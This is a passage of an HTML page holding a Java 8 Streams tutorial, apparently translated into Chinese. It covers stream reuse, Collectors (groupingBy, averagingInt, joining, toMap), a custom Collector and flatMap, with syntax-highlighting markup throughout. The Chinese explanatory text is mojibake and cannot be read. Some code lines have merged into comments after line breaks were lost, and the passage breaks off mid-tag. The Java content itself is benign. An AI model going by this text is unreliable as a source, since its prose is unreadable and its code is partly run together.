<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"map: "</span> <span class="token operator">+</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>s <span class="token operator">-></span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"forEach: "</span> <span class="token operator">+</span> s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// filter:  d2</span><span class="token comment">// filter:  a2</span><span class="token comment">// filter:  b1</span><span class="token comment">// filter:  b3</span><span class="token comment">// filter:  c</span><span class="token comment">// map:     a2</span><span class="token comment">// forEach: A2</span></code></pre><p>åœ¨æœ¬ä¾‹ä¸­ï¼Œä»æœªè°ƒç”¨sortedï¼Œå› ä¸ºfilterå°†è¾“å…¥é›†åˆå‡å°‘åˆ°åªæœ‰ä¸€ä¸ªå…ƒç´ ã€‚å› æ­¤ï¼Œå¯¹äºæ›´å¤§çš„è¾“å…¥é›†åˆï¼Œæ€§èƒ½ä¼šå¤§å¤§æé«˜</p></div><h2 id="å¤ç”¨æµ-Reusing-Streams">å¤ç”¨æµ(Reusing Streams)</h2><div class="story post-story"><p>Java 8æµä¸èƒ½è¢«é‡ç”¨ã€‚å½“ä½ è°ƒç”¨ä»»ä½•ç»ˆç«¯æ“ä½œæ—¶ï¼Œæµå°±ä¼šè¢«å…³é—­:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Stream</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> stream <span class="token operator">=</span>    <span class="token class-name">Stream</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token string">"d2"</span><span class="token punctuation">,</span> <span class="token string">"a2"</span><span class="token punctuation">,</span> <span class="token string">"b1"</span><span class="token punctuation">,</span> <span class="token string">"b3"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>s <span class="token operator">-></span> s<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>stream<span class="token punctuation">.</span><span class="token function">anyMatch</span><span class="token punctuation">(</span>s <span class="token operator">-></span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// ok</span>stream<span class="token punctuation">.</span><span class="token function">noneMatch</span><span class="token punctuation">(</span>s <span class="token operator">-></span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// exception</span></code></pre><p>åœ¨åŒä¸€ä¸ªæµçš„<code>anyMatch</code>ä¹‹åè°ƒç”¨<code>nonmatchä¼š</code>å¯¼è‡´ä»¥ä¸‹å¼‚å¸¸:</p><pre class="language-text" data-language="text"><code class="language-text">java.lang.IllegalStateException: stream has already been operated upon or closed    at java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:229)    at java.util.stream.ReferencePipeline.noneMatch(ReferencePipeline.java:459)    at com.winterbe.java8.Streams5.test7(Streams5.java:38)    at com.winterbe.java8.Streams5.main(Streams5.java:28)</code></pre><p>ä¸ºäº†å…‹æœè¿™ä¸ªé™åˆ¶ï¼Œæˆ‘ä»¬å¿…é¡»ä¸ºæƒ³è¦æ‰§è¡Œçš„æ¯ä¸ªç»ˆç«¯æ“ä½œåˆ›å»ºä¸€ä¸ªæ–°çš„æµé“¾ï¼Œä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªæµä¾›åº”å•†æ¥æ„é€ ä¸€ä¸ªæ‰€æœ‰ä¸­é—´æ“ä½œéƒ½å·²ç»è®¾ç½®å¥½çš„æ–°æµ:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Supplier</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Stream</span><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span><span class="token punctuation">></span></span> streamSupplier <span class="token operator">=</span>    <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name">Stream</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token string">"d2"</span><span class="token punctuation">,</span> <span class="token string">"a2"</span><span class="token punctuation">,</span> <span class="token string">"b1"</span><span class="token punctuation">,</span> <span class="token string">"b3"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>s <span class="token operator">-></span> s<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>streamSupplier<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">anyMatch</span><span class="token punctuation">(</span>s <span class="token operator">-></span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// okstreamSupplier.get().noneMatch(s -> true);  // ok</span></code></pre><p>å¯¹<code>get()</code>çš„æ¯æ¬¡è°ƒç”¨éƒ½ä¼šæ„é€ ä¸€ä¸ªæ–°æµï¼Œæˆ‘ä»¬å°†åœ¨å…¶ä¸Šä¿å­˜ä»¥è°ƒç”¨æ‰€éœ€çš„ç»ˆç«¯æ“ä½œã€‚</p></div><h2 id="é«˜çº§æ“ä½œ-Advanced-Operations">é«˜çº§æ“ä½œ(Advanced Operations)</h2><div class="story post-story"><p>æµæ”¯æŒè®¸å¤šä¸åŒçš„æ“ä½œã€‚æˆ‘ä»¬å·²ç»å­¦ä¹ äº†æœ€é‡è¦çš„æ“ä½œï¼Œå¦‚<code>filter</code>æˆ–<code>map</code>ã€‚æˆ‘æŠŠæ‰€æœ‰å…¶ä»–å¯ç”¨çš„æ“ä½œç•™ç»™æ‚¨å»å‘ç°(è¯·å‚é˜…<a href="http://docs.oracle.com/javase/8/docs/api/java/util/stream/Stream.html">Stream Javadoc</a>)ã€‚ç›¸åï¼Œè®©æˆ‘ä»¬æ·±å…¥ç ”ç©¶æ›´å¤æ‚çš„æ“ä½œæ”¶é›†ã€<code>flatMap</code>å’Œ<code>reduce</code>ã€‚</p><p>æœ¬èŠ‚ä¸­çš„å¤§å¤šæ•°ä»£ç ç¤ºä¾‹ä½¿ç”¨ä»¥ä¸‹äººå‘˜åˆ—è¡¨è¿›è¡Œæ¼”ç¤º:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Person</span><span class="token punctuation">></span></span> persons <span class="token operator">=</span>    <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">asList</span><span class="token punctuation">(</span>        <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"Max"</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"Peter"</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"Pamela"</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"David"</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="Collect">Collect</h3><p>Collectæ˜¯ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„ç»ˆç«¯æ“ä½œï¼Œå¯ä»¥å°†æµçš„å…ƒç´ è½¬æ¢ä¸ºå¦ä¸€ç§ç»“æœï¼Œä¾‹å¦‚: <code>list</code>,<code>map</code>,<code>set</code>.Collectæ¥å—<code>Collector</code>ï¼Œæ”¶é›†å™¨ç”±å››ç§ä¸åŒçš„æ“ä½œç»„æˆ:ä¾›åº”å•†(<em>supplier</em>)ã€ç´¯åŠ å™¨( <em>accumulator</em>)ã€åˆå¹¶å™¨(<em>combiner</em>)å’Œæ”¶å°¾å™¨(<em>finisher</em>)ã€‚ä¹ä¸€å¬ï¼Œè¿™å¬èµ·æ¥éå¸¸å¤æ‚ï¼Œä½†å¥½çš„éƒ¨åˆ†æ˜¯Java 8é€šè¿‡collectorç±»æ”¯æŒå„ç§å†…ç½®æ”¶é›†å™¨ã€‚æ‰€ä»¥å¯¹äºæœ€å¸¸è§çš„æ“ä½œï¼Œä½ ä¸éœ€è¦è‡ªå·±å®ç°æ”¶é›†å™¨ã€‚</p><p>è®©æˆ‘ä»¬ä»ä¸€ä¸ªéå¸¸å¸¸è§çš„ç”¨ä¾‹å¼€å§‹:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Person</span><span class="token punctuation">></span></span> filtered <span class="token operator">=</span>    persons        <span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>p <span class="token operator">-></span> p<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"P"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token class-name">Collectors</span><span class="token punctuation">.</span><span class="token function">toList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>filtered<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// [Peter, Pamela]</span></code></pre><p>å¦‚æ‚¨æ‰€è§ï¼Œä»æµçš„å…ƒç´ æ„é€ ä¸€ä¸ªåˆ—è¡¨éå¸¸ç®€å•ã€‚éœ€è¦ä¸€ä¸ªé›†åˆè€Œä¸æ˜¯åˆ—è¡¨-åªéœ€ä½¿ç”¨collections . toset()ã€‚</p><p>ä¸‹ä¸€ä¸ªä¾‹å­å°†æ‰€æœ‰äººæŒ‰å¹´é¾„åˆ†ç»„:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">List</span><span class="token punctuation">&lt;</span><span class="token class-name">Person</span><span class="token punctuation">></span><span class="token punctuation">></span></span> personsByAge <span class="token operator">=</span> persons    <span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token class-name">Collectors</span><span class="token punctuation">.</span><span class="token function">groupingBy</span><span class="token punctuation">(</span>p <span class="token operator">-></span> p<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>personsByAge    <span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span>age<span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"age %s: %s\n"</span><span class="token punctuation">,</span> age<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// age 18: [Max]</span><span class="token comment">// age 23: [Peter, Pamela]</span><span class="token comment">// age 12: [David]</span></code></pre><p><code>Collectors</code>æ˜¯éå¸¸å¤šæ‰å¤šè‰ºçš„ã€‚ä½ ä¹Ÿå¯ä»¥åˆ›å»ºæµå…ƒç´ çš„èšåˆï¼Œ</p><p>ä¾‹å¦‚ç¡®å®šæ‰€æœ‰äººçš„å¹³å‡å¹´é¾„:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Double</span> averageAge <span class="token operator">=</span> persons    <span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token class-name">Collectors</span><span class="token punctuation">.</span><span class="token function">averagingInt</span><span class="token punctuation">(</span>p <span class="token operator">-></span> p<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>averageAge<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 19.0</span></code></pre><p>å¦‚æœæ‚¨å¯¹æ›´å…¨é¢çš„ç»Ÿè®¡ä¿¡æ¯æ„Ÿå…´è¶£ï¼Œæ±‡æ€»æ”¶é›†å™¨å°†è¿”å›ä¸€ä¸ªç‰¹æ®Šçš„å†…ç½®æ±‡æ€»ç»Ÿè®¡ä¿¡æ¯å¯¹è±¡ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•åœ°ç¡®å®šäººå‘˜çš„æœ€å°å¹´é¾„ï¼Œæœ€å¤§å¹´é¾„å’Œç®—æœ¯å¹³å‡å¹´é¾„ä»¥åŠæ€»å’Œå’Œè®¡æ•°ã€‚</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">IntSummaryStatistics</span> ageSummary <span class="token operator">=</span>    persons        <span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token class-name">Collectors</span><span class="token punctuation">.</span><span class="token function">summarizingInt</span><span class="token punctuation">(</span>p <span class="token operator">-></span> p<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>ageSummary<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// IntSummaryStatistics&#123;count=4, sum=76, min=12, average=19.000000, max=23&#125;</span></code></pre><p>ä¸‹ä¸€ä¸ªä¾‹å­å°†æ‰€æœ‰äººè¿æ¥åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> phrase <span class="token operator">=</span> persons    <span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span>p <span class="token operator">-></span> p<span class="token punctuation">.</span>age <span class="token operator">>=</span> <span class="token number">18</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>p <span class="token operator">-></span> p<span class="token punctuation">.</span>name<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token class-name">Collectors</span><span class="token punctuation">.</span><span class="token function">joining</span><span class="token punctuation">(</span><span class="token string">" and "</span><span class="token punctuation">,</span> <span class="token string">"In Germany "</span><span class="token punctuation">,</span> <span class="token string">" are of legal age."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>phrase<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// In Germany Max and Peter and Pamela are of legal age.</span></code></pre><p>è¿æ¥æ”¶é›†å™¨æ¥å—åˆ†éš”ç¬¦ä»¥åŠå¯é€‰çš„å‰ç¼€å’Œåç¼€ã€‚</p><p>ä¸ºäº†å°†æµå…ƒç´ è½¬æ¢ä¸ºæ˜ å°„ï¼Œæˆ‘ä»¬å¿…é¡»æŒ‡å®šé”®å’Œå€¼åº”è¯¥å¦‚ä½•æ˜ å°„ã€‚è¯·è®°ä½ï¼Œæ˜ å°„çš„é”®å¿…é¡»æ˜¯å”¯ä¸€çš„ï¼Œå¦åˆ™æŠ›å‡º<code>IllegalStateException</code>ã€‚æ‚¨å¯ä»¥é€‰æ‹©å°†<code>merge</code>å‡½æ•°ä½œä¸ºé™„åŠ å‚æ•°ä¼ é€’ï¼Œä»¥ç»•è¿‡å¼‚å¸¸:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> map <span class="token operator">=</span> persons    <span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token class-name">Collectors</span><span class="token punctuation">.</span><span class="token function">toMap</span><span class="token punctuation">(</span>        p <span class="token operator">-></span> p<span class="token punctuation">.</span>age<span class="token punctuation">,</span>        p <span class="token operator">-></span> p<span class="token punctuation">.</span>name<span class="token punctuation">,</span>        <span class="token punctuation">(</span>name1<span class="token punctuation">,</span> name2<span class="token punctuation">)</span> <span class="token operator">-></span> name1 <span class="token operator">+</span> <span class="token string">";"</span> <span class="token operator">+</span> name2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// &#123;18=Max, 23=Peter;Pamela, 12=David&#125;</span></code></pre><p>ç°åœ¨æˆ‘ä»¬å·²ç»äº†è§£äº†ä¸€äº›æœ€å¼ºå¤§çš„å†…ç½®æ”¶é›†å™¨ï¼Œè®©æˆ‘ä»¬å°è¯•æ„å»ºè‡ªå·±çš„ç‰¹æ®Šæ”¶é›†å™¨ã€‚æˆ‘ä»¬æƒ³è¦å°†æµä¸­çš„æ‰€æœ‰äººè½¬æ¢ä¸ºå•ä¸ªå­—ç¬¦ä¸²ï¼Œè¯¥å­—ç¬¦ä¸²ç”±ä»¥<code>|</code>ç®¡é“å­—ç¬¦åˆ†éš”çš„æ‰€æœ‰å¤§å†™å­—æ¯ç»„æˆã€‚</p><p>ä¸ºäº†å®ç°è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬é€šè¿‡<code>collector .of()</code>åˆ›å»ºä¸€ä¸ªæ–°çš„æ”¶é›†å™¨ã€‚æˆ‘ä»¬å¿…é¡»ä¼ é€’æ”¶é›†å™¨çš„å››ä¸ªç»„æˆéƒ¨åˆ†:ä¾›åº”å•†(<em>supplier</em>)ã€ç´¯åŠ å™¨( <em>accumulator</em>)ã€åˆå¹¶å™¨(<em>combiner</em>)å’Œæ”¶å°¾å™¨(<em>finisher</em>)</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Collector</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Person</span><span class="token punctuation">,</span> <span class="token class-name">StringJoiner</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">></span></span> personNameCollector <span class="token operator">=</span>    <span class="token class-name">Collector</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span>        <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token keyword">new</span> <span class="token class-name">StringJoiner</span><span class="token punctuation">(</span><span class="token string">" | "</span><span class="token punctuation">)</span><span class="token punctuation">,</span>          <span class="token comment">// supplier        (j, p) -> j.add(p.name.toUpperCase()),  // accumulator        (j1, j2) -> j1.merge(j2),               // combiner        StringJoiner::toString);                // finisherString names = persons    .stream()    .collect(personNameCollector);System.out.println(names);  // MAX | PETER | PAMELA | DAVID</span></code></pre><p>ç”±äºJavaä¸­çš„å­—ç¬¦ä¸²æ˜¯ä¸å¯å˜çš„ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªåƒ<code>StringJoiner</code>è¿™æ ·çš„<code>helperç±»</code>æ¥è®©æ”¶é›†å™¨æ„é€ æˆ‘ä»¬çš„å­—ç¬¦ä¸²ã€‚æä¾›è€…æœ€åˆæ„é€ è¿™æ ·ä¸€ä¸ªå¸¦æœ‰é€‚å½“åˆ†éš”ç¬¦çš„<code>StringJoiner</code>ã€‚ç´¯åŠ å™¨ç”¨äºå°†æ¯ä¸ªäººçš„å¤§å†™åç§°æ·»åŠ åˆ°<code>StringJoiner</code>ä¸­ã€‚ç»„åˆå™¨çŸ¥é“å¦‚ä½•å°†ä¸¤ä¸ª<code>StringJoiners</code>åˆå¹¶ä¸ºä¸€ä¸ªã€‚åœ¨æœ€åä¸€æ­¥ä¸­ï¼Œå®Œæˆå™¨ä»StringJoineræ„é€ æ‰€éœ€çš„å­—ç¬¦ä¸²ã€‚</p><h3 id="FlatMap">FlatMap</h3><p>æˆ‘ä»¬å·²ç»å­¦ä¹ äº†å¦‚ä½•åˆ©ç”¨<code>map</code>æ“ä½œå°†æµçš„å¯¹è±¡è½¬æ¢ä¸ºå¦ä¸€ç§ç±»å‹çš„å¯¹è±¡ã€‚<code>Map</code>æœ‰ä¸€å®šçš„å±€é™æ€§ï¼Œå› ä¸ºæ¯ä¸ªå¯¹è±¡åªèƒ½æ˜ å°„åˆ°å¦ä¸€ä¸ªå¯¹è±¡ã€‚ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬æƒ³å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢ä¸ºå¤šä¸ªå…¶ä»–å¯¹è±¡ï¼Œæˆ–è€…æ ¹æœ¬ä¸è½¬æ¢è¯¥æ€ä¹ˆåŠå‘¢?è¿™å°±æ˜¯<code>flatMap</code>çš„æ•‘æ˜Ÿã€‚</p><p><code>FlatMap</code>å°†æµçš„æ¯ä¸ªå…ƒç´ è½¬æ¢ä¸ºå…¶ä»–å¯¹è±¡çš„æµã€‚å› æ­¤ï¼Œæ¯ä¸ªå¯¹è±¡å°†è¢«è½¬æ¢ä¸º0ä¸ªã€ä¸€ä¸ªæˆ–å¤šä¸ªç”±æµæ”¯æŒçš„å…¶ä»–å¯¹è±¡ã€‚è¿™äº›æµçš„å†…å®¹å°†è¢«æ”¾ç½®åˆ°<code>flatMap</code>æ“ä½œè¿”å›çš„æµä¸­ã€‚</p><p>åœ¨æˆ‘ä»¬çœ‹åˆ°flatMapçš„å®é™…åº”ç”¨ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªé€‚å½“çš„ç±»å‹å±‚æ¬¡ç»“æ„:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Foo</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Bar</span><span class="token punctuation">></span></span> bars <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Bar</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token class-name">Bar</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>æˆ‘ä»¬åˆ©ç”¨æˆ‘ä»¬å…³äºæµçš„çŸ¥è¯†æ¥å®ä¾‹åŒ–å‡ ä¸ªå¯¹è±¡:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Foo</span><span class="token punctuation">></span></span> foos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// create foos</span><span class="token class-name">IntStream</span>    <span class="token punctuation">.</span><span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>i <span class="token operator">-></span> foos<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Foo</span><span class="token punctuation">(</span><span class="token string">"Foo"</span> <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// create bars</span>foos<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>f <span class="token operator">-></span>    <span class="token class-name">IntStream</span>        <span class="token punctuation">.</span><span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>i <span class="token operator">-></span> f<span class="token punctuation">.</span>bars<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Bar</span><span class="token punctuation">(</span><span class="token string">"Bar"</span> <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token string">" &lt;- "</span> <span class="token operator">+</span> f<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ç°åœ¨æˆ‘ä»¬æœ‰ä¸€ä¸ªåŒ…å«ä¸‰ä¸ª<code>foo</code>çš„åˆ—è¡¨ï¼Œæ¯ä¸ª<code>foo</code>ç”±<code>ä¸‰ä¸ªbar</code>ç»„æˆã€‚</p><p><code>FlatMap</code>æ¥å—ä¸€ä¸ªå¿…é¡»è¿”å›å¯¹è±¡æµçš„å‡½æ•°ã€‚å› æ­¤ï¼Œä¸ºäº†è§£ææ¯ä¸ªfooçš„barå¯¹è±¡ï¼Œæˆ‘ä»¬åªéœ€ä¼ é€’é€‚å½“çš„å‡½æ•°:</p><pre class="language-java" data-language="java"><code class="language-java">foos<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">flatMap</span><span class="token punctuation">(</span>f <span class="token operator">-></span> f<span class="token punctuation">.</span>bars<span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>b <span class="token operator">-></span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Bar1 &lt;- Foo1</span><span class="token comment">// Bar2 &lt;- Foo1</span><span class="token comment">// Bar3 &lt;- Foo1</span><span class="token comment">// Bar1 &lt;- Foo2</span><span class="token comment">// Bar2 &lt;- Foo2</span><span class="token comment">// Bar3 &lt;- Foo2</span><span 